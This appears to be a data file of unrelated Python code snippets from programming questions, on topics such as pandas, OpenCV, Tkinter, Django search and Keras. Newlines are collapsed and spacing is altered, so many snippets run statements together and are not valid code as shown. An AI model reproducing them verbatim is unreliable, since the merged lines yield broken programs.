"root = Tkinter.Tk ( ) types = [ ( 'Comma Separated Values ' , '.csv ' ) , ( 'All Files ' , '* ' ) ] filename = tkFileDialog.askopenfilename ( parent=root , filetypes=types ) root.destroy ( ) import tkFileDialogold_dialog = tkFileDialog.askopenfilenametry : tkFileDialog.askopenfilename = lambda *args , **kw : filename # First test dialog cancelled filename = `` method_that_calls_tk ( ) # run some assertions # Next test a valid file name with valid contents filename = self.VALID_FILENAME method_that_calls_tk ( ) # run some assertions # Now test a valid file name with invalid contents filename = self.INVALID_CONTENTS_FILENAME method_that_calls_tk ( ) # run some assertions # Now test an invalid file name filename = self.INVALID_FILENAME method_that_calls_tk ( ) # run some assertionsfinally : tkFileDialog.askopenfilename = old_dialog"
"class BaseClass ( object ) : def save ( self , *args , **kwargs ) : print ( `` Base Called '' ) class Foo ( BaseClass ) : def save ( self , *args , **kwargs ) : # do_stuff print ( `` Foo called '' ) return super ( Foo , self ) .save ( *args , **kwargs ) obj = Foo ( )"
If image.height > image.width : size = image.heightIf image.height < image.width : size = image.widthIf size > 1280 : resize maintaining aspect ratio
"a = [ 1,2,3,4 ] b = [ 1,2,3,4 ] c = [ 1,2,4,3 ] d = [ 1,2,3,5 ] for i in range ( len ( a ) ) : if a [ i ] ! = c [ i ] : print `` Expected value at `` , i , '' is `` , a [ i ] print `` But got value `` , c [ i ] , '' in second list ''"
"EMAIL_BACKEND = 'djcelery_email.backends.CeleryEmailBackend ' LOGGING = { # ... 'handlers ' : { 'mail_admins ' : { 'level ' : 'ERROR ' , 'filters ' : [ 'require_debug_false ' ] , 'class ' : 'django.utils.log.AdminEmailHandler ' , } , # ... }"
"class a : s = 'python ' b = [ ' p ' , ' y ' ] c = [ x for x in s ] > > > a.c [ ' p ' , ' y ' , 't ' , ' h ' , ' o ' , ' n ' ] class a : s = 'python ' b = [ ' p ' , ' y ' ] c = [ x for x in s if x in b ] Traceback ( most recent call last ) : File `` < pyshell # 22 > '' , line 1 , in < module > class a : File `` < pyshell # 22 > '' , line 4 , in a c = [ x for x in s if x in b ] File `` < pyshell # 22 > '' , line 4 , in < listcomp > c = [ x for x in s if x in b ] NameError : global name ' b ' is not defined"
"W = [ [ True for pattern in xrange ( len ( patterns ) ) ] for cell in xrange ( 20*20 ) ] H = [ entropyValue for cell in xrange ( 20*20 ) ] from collections import Counterfrom itertools import chain , izipimport mathd = 20 # dimensions of output ( array of dxd cells ) N = 3 # dimensions of a pattern ( NxN matrix ) Output = [ 120 for i in xrange ( d*d ) ] # array holding the color value for each cell in the output ( at start each cell is grey = 120 ) def setup ( ) : size ( 800 , 800 , P2D ) textSize ( 11 ) global W , H , A , freqs , patterns , directions , xs , ys , npat img = loadImage ( 'Flowers.png ' ) # path to the input image iw , ih = img.width , img.height # dimensions of input image xs , ys = width//d , height//d # dimensions of cells ( squares ) in output kernel = [ [ i + n*iw for i in xrange ( N ) ] for n in xrange ( N ) ] # NxN matrix to read every patterns contained in input image directions = [ ( -1 , 0 ) , ( 1 , 0 ) , ( 0 , -1 ) , ( 0 , 1 ) ] # ( x , y ) tuples to access the 4 neighboring cells of a collapsed cell all = [ ] # array list to store all the patterns found in input # Stores the different patterns found in input for y in xrange ( ih ) : for x in xrange ( iw ) : `` ' The one-liner below ( cmat ) creates a NxN matrix with ( x , y ) being its top left corner . This matrix will wrap around the edges of the input image . The whole snippet reads every NxN part of the input image and store the associated colors . Each NxN part is called a 'pattern ' ( of colors ) . Each pattern can be rotated or flipped ( not mandatory ) . `` ' cmat = [ [ img.pixels [ ( ( x+n ) % iw ) + ( ( ( a [ 0 ] +iw*y ) /iw ) % ih ) *iw ] for n in a ] for a in kernel ] # Storing rotated patterns ( 90° , 180° , 270° , 360° ) for r in xrange ( 4 ) : cmat = zip ( *cmat [ : :-1 ] ) # +90° rotation all.append ( cmat ) # Storing reflected patterns ( vertical/horizontal flip ) all.append ( cmat [ : :-1 ] ) all.append ( [ a [ : :-1 ] for a in cmat ] ) # Flatten pattern matrices + count occurences `` ' Once every pattern has been stored , - we flatten them ( convert to 1D ) for convenience - count the number of occurences for each one of them ( one pattern can be found multiple times in input ) - select unique patterns only - store them from less common to most common ( needed for weighted choice ) ' '' all = [ tuple ( chain.from_iterable ( p ) ) for p in all ] # flattern pattern matrices ( NxN -- > [ ] ) c = Counter ( all ) freqs = sorted ( c.values ( ) ) # number of occurences for each unique pattern , in sorted order npat = len ( freqs ) # number of unique patterns total = sum ( freqs ) # sum of frequencies of unique patterns patterns = [ p [ 0 ] for p in c.most_common ( ) [ : -npat-1 : -1 ] ] # list of unique patterns sorted from less common to most common # Computes entropy `` ' The entropy of a cell is correlated to the number of possible patterns that cell holds . The more a cell has valid patterns ( set to 'True ' ) , the higher its entropy is . At start , every pattern is set to 'True ' for each cell . So each cell holds the same high entropy value '' ' ent = math.log ( total ) - sum ( map ( lambda x : x * math.log ( x ) , freqs ) ) / total # Initializes the 'wave ' ( W ) , entropy ( H ) and adjacencies ( A ) array lists W = [ [ True for _ in xrange ( npat ) ] for i in xrange ( d*d ) ] # every pattern is set to 'True ' at start , for each cell H = [ ent for i in xrange ( d*d ) ] # same entropy for each cell at start ( every pattern is valid ) A = [ [ set ( ) for dir in xrange ( len ( directions ) ) ] for i in xrange ( npat ) ] # see below for explanation # Compute patterns compatibilities ( check if some patterns are adjacent , if so - > store them based on their location ) `` ' EXAMPLE : If pattern index 42 can placed to the right of pattern index 120 , we will store this adjacency rule as follow : A [ 120 ] [ 1 ] .add ( 42 ) Here ' 1 ' stands for 'right ' or 'East'/ ' E ' 0 = left or West/W 1 = right or East/E 2 = up or North/N 3 = down or South/S `` ' # Comparing patterns to each other for i1 in xrange ( npat ) : for i2 in xrange ( npat ) : for dir in ( 0 , 2 ) : if compatible ( patterns [ i1 ] , patterns [ i2 ] , dir ) : A [ i1 ] [ dir ] .add ( i2 ) A [ i2 ] [ dir+1 ] .add ( i1 ) def compatible ( p1 , p2 , dir ) : `` 'NOTE : what is refered as 'columns ' and 'rows ' here below is not really columns and rows since we are dealing with 1D patterns . Remember here N = 3 '' ' # If the first two columns of pattern 1 == the last two columns of pattern 2 # -- > pattern 2 can be placed to the left ( 0 ) of pattern 1 if dir == 0 : return [ n for i , n in enumerate ( p1 ) if i % N ! =2 ] == [ n for i , n in enumerate ( p2 ) if i % N ! =0 ] # If the first two rows of pattern 1 == the last two rows of pattern 2 # -- > pattern 2 can be placed on top ( 2 ) of pattern 1 if dir == 2 : return p1 [ :6 ] == p2 [ -6 : ] def draw ( ) : # Equivalent of a 'while ' loop in Processing ( all the code below will be looped over and over until all cells are collapsed ) global H , W , grid # # # OBSERVATION # Find cell with minimum non-zero entropy ( not collapsed yet ) `` 'Randomly select 1 cell at the first iteration ( when all entropies are equal ) , otherwise select cell with minimum non-zero entropy '' ' emin = int ( random ( d*d ) ) if frameCount < = 1 else H.index ( min ( H ) ) # Stoping mechanism `` ' When ' H ' array is full of 'collapsed ' cells -- > stop iteration `` ' if H [ emin ] == 'CONT ' or H [ emin ] == 'collapsed ' : print 'stopped ' noLoop ( ) return # # # COLLAPSE # Weighted choice of a pattern `` ' Among the patterns available in the selected cell ( the one with min entropy ) , select one pattern randomly , weighted by the frequency that pattern appears in the input image . With Python 2.7 no possibility to use random.choice ( x , weight ) so we have to hard code the weighted choice `` ' lfreqs = [ b * freqs [ i ] for i , b in enumerate ( W [ emin ] ) ] # frequencies of the patterns available in the selected cell weights = [ float ( f ) / sum ( lfreqs ) for f in lfreqs ] # normalizing these frequencies cumsum = [ sum ( weights [ : i ] ) for i in xrange ( 1 , len ( weights ) +1 ) ] # cumulative sums of normalized frequencies r = random ( 1 ) idP = sum ( [ cs < r for cs in cumsum ] ) # index of selected pattern # Set all patterns to False except for the one that has been chosen W [ emin ] = [ 0 if i ! = idP else 1 for i , b in enumerate ( W [ emin ] ) ] # Marking selected cell as 'collapsed ' in H ( array of entropies ) H [ emin ] = 'collapsed ' # Storing first color ( top left corner ) of the selected pattern at the location of the collapsed cell Output [ emin ] = patterns [ idP ] [ 0 ] # # # PROPAGATION # For each neighbor ( left , right , up , down ) of the recently collapsed cell for dir , t in enumerate ( directions ) : x = ( emin % d + t [ 0 ] ) % d y = ( emin/d + t [ 1 ] ) % d idN = x + y * d # index of neighbor # If that neighbor has n't been collapsed yet if H [ idN ] ! = 'collapsed ' : # Check indices of all available patterns in that neighboring cell available = [ i for i , b in enumerate ( W [ idN ] ) if b ] # Among these indices , select indices of patterns that can be adjacent to the collapsed cell at this location intersection = A [ idP ] [ dir ] & set ( available ) # If the neighboring cell contains indices of patterns that can be adjacent to the collapsed cell if intersection : # Remove indices of all other patterns that can not be adjacent to the collapsed cell W [ idN ] = [ True if i in list ( intersection ) else False for i in xrange ( npat ) ] # # # Update entropy of that neighboring cell accordingly ( less patterns = lower entropy ) # If only 1 pattern available left , no need to compute entropy because entropy is necessarily 0 if len ( intersection ) == 1 : H [ idN ] = ' 0 ' # Putting a str at this location in ' H ' ( array of entropies ) so that it does n't return 0 ( float ) when looking for minimum entropy ( min ( H ) ) at next iteration # If more than 1 pattern available left -- > compute/update entropy + add noise ( to prevent cells to share the same minimum entropy value ) else : lfreqs = [ b * f for b , f in izip ( W [ idN ] , freqs ) if b ] ent = math.log ( sum ( lfreqs ) ) - sum ( map ( lambda x : x * math.log ( x ) , lfreqs ) ) / sum ( lfreqs ) H [ idN ] = ent + random ( .001 ) # If no index of adjacent pattern in the list of pattern indices of the neighboring cell # -- > mark cell as a 'contradiction ' else : H [ idN ] = 'CONT ' # Draw output `` ' dxd grid of cells ( squares ) filled with their corresponding color . That color is the first ( top-left ) color of the pattern assigned to that cell `` ' for i , c in enumerate ( Output ) : x , y = i % d , i/d fill ( c ) rect ( x * xs , y * ys , xs , ys ) # Displaying corresponding entropy value fill ( 0 ) text ( H [ i ] , x * xs + xs/2 - 12 , y * ys + ys/2 )"
"mywords= [ 'how ' , 'no ' , 'because ' , 'sheep ' , 'mahogany ' ] n = len ( mywords ) a=0while a < n : print ( ( len ( list ( mywords [ a ] ) ) ) ) a += 1if a > n : break"
import randomrandom.seed ( 13 ) # finerandom.seed ( 1234567890 ) # also finerandom.seed ( 31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989 ) # also fine
"import cv2import numpy as npimg = cv2.imread ( 'test.png ' ) gray = cv2.cvtColor ( img , cv2.COLOR_BGR2GRAY ) edges = cv2.Canny ( gray,50,150 , apertureSize = 3 ) minLineLength = 100maxLineGap = 10lines = cv2.HoughLinesP ( edges,1 , np.pi/180,100 , minLineLength , maxLineGap ) for num in range ( 0 , len ( lines ) ) : for x1 , y1 , x2 , y2 in lines [ num ] : cv2.line ( img , ( x1 , y1 ) , ( x2 , y2 ) , ( 0,255,0 ) ,2 ) cv2.imwrite ( 'houghlines.jpg ' , img )"
"import numpy as npimport cv2 # # # # # # # # # # # # # # # # # # # # # # # # # # SIFT descriptors part # # # # # # # # # # # # # # # # # # # # # # # # # # img1 = cv2.imread ( '/Users/valentinjungbluth/Desktop/SIFT : SURF Algo/lampe.jpg',0 ) img2 = cv2.imread ( '/Users/valentinjungbluth/Desktop/SIFT : SURF Algo/ville.jpg',0 ) # Initiate SIFT detectorsift = cv2.xfeatures2d.SIFT_create ( ) print ( img1.dtype ) print ( img2.dtype ) kp1 , des1 = sift.detectAndCompute ( img1 , None ) kp2 , des2 = sift.detectAndCompute ( img2 , None ) bf = cv2.BFMatcher ( ) matches = bf.knnMatch ( des1 , des2 , k=2 ) good = [ ] for m , n in matches : if m.distance < 0.2*n.distance : good.append ( [ m ] ) img3 = cv2.drawMatchesKnn ( img1 , kp1 , img2 , kp2 , good , None , flags=2 ) cv2.imwrite ( 'matches.jpg ' , img3 )"
In [ 44 ] : dfOut [ 44 ] : DATETIME OFFSET0 2013-01-01 00:00:00+00:00 11 2013-01-01 01:00:00+00:00 12 2013-01-01 02:00:00+00:00 13 2013-01-01 03:00:00+00:00 14 2013-01-01 04:00:00+00:00 15 2013-01-01 05:00:00+00:00 16 2013-01-01 06:00:00+00:00 27 2013-01-01 07:00:00+00:00 28 2013-01-01 08:00:00+00:00 2 In [ 44 ] : dfOut [ 44 ] : DATETIME OFFSET0 2013-01-01 00:00:00+01:00 11 2013-01-01 01:00:00+01:00 12 2013-01-01 02:00:00+01:00 13 2013-01-01 03:00:00+01:00 14 2013-01-01 04:00:00+01:00 15 2013-01-01 05:00:00+01:00 16 2013-01-01 06:00:00+02:00 27 2013-01-01 07:00:00+02:00 28 2013-01-01 08:00:00+02:00 2 df.apply ( lambda x : x [ 'DATETIME ' ] .replace ( tzinfo=pytz.utc + x [ 'OFFSET ' ] )
"setup ( ... packages=find_packages ( exclude= [ 'tests.* ' , 'tests ' , 'docs . * ' , 'docs ' ] ) , ... ) python setup.py sdist python setup.py bdist"
"from traits.api import HasTraits , Range , List , Floatimport traitsclass Amplifier ( HasTraits ) : `` '' '' Define an Amplifier ( a la Spinal Tap ) with Enthought 's traits . Use traits to enforce values boundaries on the Amplifier 's objects . Use events to notify via the console when the volume trait is changed and when new volume traits are added to inputs. `` '' '' volume = Range ( value=5.0 , trait=Float , low=0.0 , high=11.0 ) inputs = List ( volume ) # I want to fire a static trait event notification # when another volume element is added def __init__ ( self , volume=5.0 ) : super ( Amplifier , self ) .__init__ ( ) self.volume = volume self.inputs.append ( volume ) def _volume_changed ( self , old , new ) : # static event listener for self.volume if not ( new in self.inputs ) : self.inputs.append ( self.volume ) if new == 11.0 : print `` This one goes to eleven ... so far , we have seen '' , self.inputs def _inputs_changed ( self , old , new ) : # static event listener for self.inputs print `` Check it out ! ! `` if __name__=='__main__ ' : spinal_tap = Amplifier ( ) spinal_tap.volume = 11.0 print `` DIRECTLY adding a new volume input ... '' spinal_tap.inputs.append ( 4.0 ) try : print `` NEGATIVE Test ... adding 12.0 '' spinal_tap.inputs.append ( 12.0 ) except traits.trait_errors.TraitError : print `` Test passed '' [ mpenning @ Bucksnort ~ ] $ python spinaltap.pyThis one goes to eleven ... so far , we have seen [ 5.0 , 11.0 ] DIRECTLY adding a new volume input ... NEGATIVE Test ... adding 12.0Test passed [ mpenning @ Bucksnort ~ ] $"
"ID Date11 3/19/201822 1/5/201833 2/12/2018.. .. ID Date11 3/15/201811 3/16/201811 3/17/201811 3/18/201811 3/19/201822 1/1/201822 1/2/201822 1/3/201822 1/4/201822 1/5/201833 2/8/201833 2/9/201833 2/10/201833 2/11/201833 2/12/2018… … def date_list ( row ) : list = pd.date_range ( row [ `` Date '' ] , periods=5 ) return listdf [ `` Date_list '' ] = df.apply ( date_list , axis = `` columns '' )"
"class CustomInstallCommand ( install ) : def run ( self ) : arguments = [ 'npm ' , 'install ' , ' -- prefix ' , 'test/functional ' , 'promisify ' ] subprocess.call ( arguments , shell=True ) install.run ( self ) setup ( cmdclass= { 'install ' : CustomInstallCommand } ,"
"user = [ { 'name ' : 'ozzy ' , 'quantity ' : 5 } , { 'name ' : 'frank ' , 'quantity ' : 4 } , { 'name ' : 'ozzy ' , 'quantity ' : 3 } , { 'name ' : 'frank ' , 'quantity ' : 2 } , { 'name ' : 'james ' , 'quantity ' : 7 } , ] user = [ { 'name ' : 'ozzy ' , 'quantity ' : 8 } , { 'name ' : 'frank ' , 'quantity ' : 6 } , { 'name ' : 'james ' , 'quantity ' : 7 } ] newList = [ ] quan = 0 for i in range ( 0 , len ( user ) ) : originator = user [ i ] [ 'name ' ] for j in range ( i+1 , len ( user ) ) : if originator == user [ j ] [ 'name ' ] : quan = user [ i ] [ 'quantity ' ] + user [ j ] [ 'quantity ' ] newList.append ( { 'name ' : originator , 'Quantity ' : quan } )"
"# include `` transcendentals_api.h '' # include < math.h > # include < stdio.h > int main ( int argc , char **argv ) { Py_SetPythonHome ( L '' /Users/spacegoing/anaconda '' ) ; Py_Initialize ( ) ; import_transcendentals ( ) ; printf ( `` pi**e : % f\n '' , pow ( get_pi ( ) , get_e ( ) ) ) ; Py_Finalize ( ) ; return 0 ; } cdef api double get_pi ( ) : return 3.1415926cdef api double get_e ( ) : print ( `` calling get_e ( ) '' ) return 2.718281828 from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Build import cythonizesetup ( ext_modules=cythonize ( [ Extension ( `` transcendentals '' , [ `` transcendentals.pyx '' ] ) ] ) ) python-config=/Users/spacegoing/anaconda/bin/python3-configldflags : = $ ( shell $ ( python-config ) -- ldflags ) cflags : = $ ( shell $ ( python-config ) -- cflags ) a.out : main.c transcendentals.so gcc-5 $ ( cflags ) $ ( ldflags ) transcendentals.c main.ctranscendentals.so : setup.py transcendentals.pyx python setup.py build_ext -- inplace cython transcendentals.pyxclean : rm -r a.out a.out.dSYM build transcendentals . [ ch ] transcendentals.so transcendentals_api.h"
assert orig_list == new_list
"class A ( object ) : def __set__ ( self , instance , value ) : print `` __set__ called : `` , valueclass B ( object ) : def __init__ ( self ) : self.a = A ( ) class C ( object ) : a = A ( ) def test1 ( class_in ) : o = class_in ( ) o.a = `` test '' if isinstance ( o.a , A ) : print `` pass '' else : print `` fail '' def test2 ( class_in ) : o1 , o2 = class_in ( ) , class_in ( ) if o1.a is o2.a : print `` fail '' else : print `` pass ''"
"In [ 1 ] : import pandas as pdIn [ 2 ] : orig_df = pd.DataFrame ( { 'AAA ' : [ 4,5,6,7 ] , 'BBB ' : [ 10,20,30,40 ] , 'CCC ' : [ 100,50 , -30 , -50 ] } ) ; orig_dfOut [ 2 ] : AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50 [ 4 rows x 3 columns ] In [ 3 ] : orig_df.to_csv ( 'test.csv ' ) In [ 4 ] : final_df = pd.read_csv ( 'test.csv ' ) ; final_dfOut [ 4 ] : Unnamed : 0 AAA BBB CCC0 0 4 10 1001 1 5 20 502 2 6 30 -303 3 7 40 -50 [ 4 rows x 4 columns ] In [ 6 ] : final2_df = pd.read_csv ( 'test.csv ' , index_col=0 ) ; final2_dfOut [ 7 ] : AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50 [ 4 rows x 3 columns ] In [ 8 ] : df.to_csv ( 'test2.csv ' , index=False ) In [ 9 ] : pd.read_csv ( 'test2.csv ' ) Out [ 9 ] : AAA BBB CCC0 4 10 1001 5 20 502 6 30 -303 7 40 -50"
class Empty : pass class Empty : `` ' This class intentionally left blank `` '
< if > < condition > < recv > < MesgTypeA/ > < /recv > < /condition > < loop count=10 > < send > < MesgTypeB > < param1 > 12 < /param1 > < param2 > 52 < /param2 > < /MesgTypeB > < /send > < /loop > < /if >
"import itertools as itimport numpy as npfrom matplotlib.ticker import FuncFormatterfrom matplotlib.contour import ClabelTextimport matplotlib.pyplot as pltfrom math import pi , log def getTime ( data ) : M = data [ 'weight ' ] Tei = data [ 'temp ' ] Twasser = 99.8 Teikl = 86.0 # # max allowed temp k = 0.262 # # estimate was 0.3 W/ ( m.K ) , Crho = 3.18 # ( KJ/kgC ) const = pow ( Crho , 1.0/3 ) / ( pi*pi*k*pow ( 4*pi/3,2.0/3 ) ) Tval = const*pow ( M,2.0/3 ) *log ( 0.76* ( Tei-Twasser ) / ( Teikl-Twasser ) ) return Tval # coo time in minutesdef contourFmt ( val , posn ) : mins = int ( val // 1 ) secs = int ( val % 1 *60 ) return ' { 0 : d } mm { 1 : d } ss'.format ( mins , secs ) def labeler ( val ) : # is this any use ? ? print ( val ) return # weights = np.array ( range ( 40 , 80 , 5 ) ) *1.0 # temps = np.array ( range ( 0 , 30 , 5 ) ) *1.0weights = np.arange ( 40.0 , 80.0 , 5.0 ) temps = np.arange ( 0.0 , 25.01 , 5.0 ) X = tempsY = weightsZ = np.zeros ( ( len ( X ) , len ( Y ) ) ) xx = [ { 'temp ' : i } for i in X ] yy = [ { 'weight ' : i } for i in Y ] plt.figure ( ) # # zz = it.product ( xx , yy ) for i , xdicts in enumerate ( xx ) : for j , ydicts in enumerate ( yy ) : zd = { } zd.update ( xdicts ) zd.update ( ydicts ) zval = getTime ( zd ) Z [ i , j ] = zvaltimes = np.arange ( 4.00 , 6.50 , 0.25 ) CS = plt.contour ( Y , X , Z , levels=times , colors= ' b ' ) lbl = ClabelText ( labeler ) lbl.set_rotation ( 'horizontal ' ) formatter = FuncFormatter ( contourFmt ) # plt.clabel ( CS , inline=True , fmt=formatter , fontsize=12 ) plt.clabel ( CS , inline=True , use_clabeltext=True , fmt=formatter , fontsize=12 ) plt.grid ( True ) plt.clabel ( CS , inline=1 , fontsize=12 ) plt.show ( )"
"log_format = `` * % ( asctime ) s % ( levelname ) -8s % ( message ) s '' date_format = `` % a , % d % b % Y % H : % M : % S '' console = logging.StreamHandler ( ) fr = logging.Formatter ( log_format ) console.setFormatter ( fr ) logger = logging.getLogger ( ) logger.addFilter ( SuperfluousFilter ( ) ) logger.addHandler ( console ) logger.setLevel ( logging.DEBUG ) console.setLevel ( logging.DEBUG ) logging.error ( `` Reconfiguring logging '' ) ERROR 2010-06-23 20:46:18,871 initialize.py:38 ] Reconfiguring logging2010-06-23 20:46:18,871 ERROR Reconfiguring logging"
print `` mod '' import __init__print `` sub '' > > > import modmod > > > import mod.submodsub > > > import mod.submodmodsub
"def RunAnalyseMLMlogit ( dataset , outcomevars , meeneemvars , randintercept , randslope ) : from rpy2.robjects import pandas2ri from rpy2.robjects.packages import importr base = importr ( 'base ' ) stats = importr ( 'stats ' ) lme4 = importr ( 'lme4 ' ) # data with SavReaderNp ( dataset ) as reader_np : array = reader_np.to_structured_array ( ) df = pd.DataFrame ( array ) variabelen = ' '.join ( outcomevars ) + ' ~ ' + '+'.join ( meeneemvars ) randintercept2 = [ ' ( 1|'+i+ ' ) ' for i in randintercept ] intercept = '+'.join ( randintercept2 ) randslope2 = [ ' ( 1+'+meeneemvars [ 0 ] +'|'+i+ ' ) ' for i in randslope ] slope = ' '.join ( randslope2 ) pandas2ri.activate ( ) r_df = pandas2ri.py2ri ( df ) # model # random intercepts + random slopes if len ( randslope ) > 0 : formula = variabelen + '+ ' + intercept + '+ ' + slope # only random intercepts else : formula = variabelen + '+ ' + intercept model = lme4.glmer ( formula , data=r_df , family= 'binomial ' ) resultaat = base.summary ( model ) .rx2 ( 'coefficients ' ) uitkomst = base.summary ( model ) return uitkomst"
"totalmass = mdef pepList ( ) : tempList = [ `` ] temp2List = [ ] length = 0 total = 0 aminoList = 'GASPVTCINDKEMHFRYW ' # this are all the aminoacids while length < maxLength : for i in tempList : for j in aminoList : pepMass = peptideMass ( i+j , massTable ) # find the mass of # this peptide if pepMass == totalmass : total += 1 elif pepMass < = totalmass : temp2List.append ( i+j ) tempList = [ ] for i in temp2List : tempList.append ( i ) temp2List = [ ] length = length + 1 print ( total ) pepList ( ) total = 0pepList = [ ] for i in range ( maxLength+1 ) : for p in itertools.combinations_with_replacement ( aminoList , i ) : # order matters for the total number of peptides but not for calculating # the total mass amino = `` .join ( p ) if peptideMass ( amino , massTable ) == mass : pepList.append ( amino ) print ( len ( pepList ) ) newpepList = [ ] for i in pepList : for p in itertools.permutations ( i , r = len ( i ) ) : # I use permutations here to get the total number because order matters if p not in newpepList : newpepList.append ( p ) total +=1print ( total )"
"with tf.GradientTape ( ) as tape : logits = model ( tf.cast ( image_batch_val , dtype=tf.float32 ) ) print ( ' ` logits ` has type { 0 } '.format ( type ( logits ) ) ) xentropy = tf.nn.softmax_cross_entropy_with_logits ( labels=tf.cast ( tf.one_hot ( 1-label_batch_val , depth=2 ) , dtype=tf.int32 ) , logits=logits ) reduced = tf.reduce_mean ( xentropy ) grads = tape.gradient ( reduced , model.trainable_variables ) image_input = Input ( ( input_size , input_size , 3 ) ) conv_0 = Conv2D ( 32 , ( 3 , 3 ) , padding='SAME ' ) ( image_input ) conv_0_bn = BatchNormalization ( ) ( conv_0 ) conv_0_act = Activation ( 'relu ' ) ( conv_0_bn ) conv_0_pool = MaxPool2D ( ( 2 , 2 ) ) ( conv_0_act ) conv_1 = Conv2D ( 64 , ( 3 , 3 ) , padding='SAME ' ) ( conv_0_pool ) conv_1_bn = BatchNormalization ( ) ( conv_1 ) conv_1_act = Activation ( 'relu ' ) ( conv_1_bn ) conv_1_pool = MaxPool2D ( ( 2 , 2 ) ) ( conv_1_act ) conv_2 = Conv2D ( 64 , ( 3 , 3 ) , padding='SAME ' ) ( conv_1_pool ) conv_2_bn = BatchNormalization ( ) ( conv_2 ) conv_2_act = Activation ( 'relu ' ) ( conv_2_bn ) conv_2_pool = MaxPool2D ( ( 2 , 2 ) ) ( conv_2_act ) conv_3 = Conv2D ( 128 , ( 3 , 3 ) , padding='SAME ' ) ( conv_2_pool ) conv_3_bn = BatchNormalization ( ) ( conv_3 ) conv_3_act = Activation ( 'relu ' ) ( conv_3_bn ) conv_4 = Conv2D ( 128 , ( 3 , 3 ) , padding='SAME ' ) ( conv_3_act ) conv_4_bn = BatchNormalization ( ) ( conv_4 ) conv_4_act = Activation ( 'relu ' ) ( conv_4_bn ) conv_4_pool = MaxPool2D ( ( 2 , 2 ) ) ( conv_4_act ) conv_5 = Conv2D ( 128 , ( 3 , 3 ) , padding='SAME ' ) ( conv_4_pool ) conv_5_bn = BatchNormalization ( ) ( conv_5 ) conv_5_act = Activation ( 'relu ' ) ( conv_5_bn ) conv_6 = Conv2D ( 128 , ( 3 , 3 ) , padding='SAME ' ) ( conv_5_act ) conv_6_bn = BatchNormalization ( ) ( conv_6 ) conv_6_act = Activation ( 'relu ' ) ( conv_6_bn ) flat = Flatten ( ) ( conv_6_act ) fc_0 = Dense ( 64 , activation='relu ' ) ( flat ) fc_0_bn = BatchNormalization ( ) ( fc_0 ) fc_1 = Dense ( 32 , activation='relu ' ) ( fc_0_bn ) fc_1_drop = Dropout ( 0.5 ) ( fc_1 ) output = Dense ( 2 , activation='softmax ' ) ( fc_1_drop ) model = models.Model ( inputs=image_input , outputs=output )"
"from haystack.query import SearchQuerySetfrom haystack.generic_views import SearchViewfrom .forms import ProviderSearchFormfrom .models import Providerclass ProviderSearchView ( SearchView ) : template_name = 'search/provider_search.html ' form_class = ProviderSearchForm def get_context_data ( self , *args , **kwargs ) : `` '' '' Extends context to include data for services . '' '' '' context = super ( ProviderSearchView , self ) .get_context_data ( *args , **kwargs ) context [ 'body_attr ' ] = 'id= '' provider-search '' ' return context def get_queryset ( self ) : queryset = super ( ProviderSearchView , self ) .get_queryset ( ) return queryset.filter ( is_active=True ) from haystack import indexesfrom .models import Providerclass ProviderIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) title = indexes.CharField ( model_attr='name ' ) created = indexes.DateTimeField ( model_attr='created ' ) def get_model ( self ) : return Provider def index_queryset ( self , using=None ) : `` Used when the entire index for model is updated . '' return self.get_model ( ) .objects.all ( ) from django import formsfrom crispy_forms.helper import FormHelperfrom crispy_forms.layout import Layout , Field , Submitfrom crispy_forms.bootstrap import FieldWithButtonsfrom haystack.forms import SearchFormfrom .models import Providerclass ProviderSearchForm ( SearchForm ) : `` '' '' Override the form with crispy styles `` '' '' models = [ Provider ] def __init__ ( self , *args , **kwargs ) : super ( ProviderSearchForm , self ) .__init__ ( *args , **kwargs ) self.helper = FormHelper ( ) self.helper.disable_csrf = True self.helper.form_tag = False self.helper.form_show_labels = False self.helper.layout = Layout ( FieldWithButtons ( Field ( ' q ' , css_class='form-control input-lg ' , placeholder= '' Search providers ... '' ) , Submit ( `` , 'Search ' , css_class='btn btn-lg btn-primary ' ) ) ) def get_models ( self ) : return self.models def search ( self ) : sqs = super ( ProviderSearchForm , self ) .search ( ) .models ( *self.get_models ( ) ) return sqs def no_query_found ( self ) : return self.searchqueryset.all ( )"
"Fatal Python error : Py_Initialize : unable to load the file system codec # include `` stdafx.h '' # include `` python.h '' int _tmain ( int argc , _TCHAR* argv [ ] ) { // calling or not calling Py_SetProgramName does n't seem to change anything //Py_SetProgramName ( argv [ 0 ] ) ; // python_lib is a directory with contents of python33/Lib // python_lib.zip is an equivalent ZIP archive with contents of python33/Lib ( without any top-level subdirs ) // _scripts.dat is a ZIP archive containing a custom script ( hello.py ) //Py_SetPath ( L '' python_lib ; _scripts.dat '' ) ; // works fine ! ( non-zipped standard library , zipped custom script ) Py_SetPath ( L '' python_lib.zip ; _scripts.dat '' ) ; // both std library and scripts are zipped - fails with error `` unable to load the file system codec '' during Py_Initialize ( ) Py_Initialize ( ) ; PyRun_SimpleString ( `` from time import time , ctime\n '' `` print ( 'Today is ' , ctime ( time ( ) ) ) \n '' ) ; PyRun_SimpleString ( `` import hello '' ) ; // runs hello.py from inside _scripts.dat ( works fine if Py_Initialize succeeds ) Py_Finalize ( ) ; return 0 ; }"
.venv [ virtual environment ] appsbudgetApp __init__.py settings.py urls.py wsgi.pymanage.py
"> > > > def myFunction ( ) : return 1 > > > > test = myFunction > > > > test ( ) 1 > > > > test2 = printFile `` < stdin > '' , line 1 test2 = print ^SyntaxError : invalid syntax"
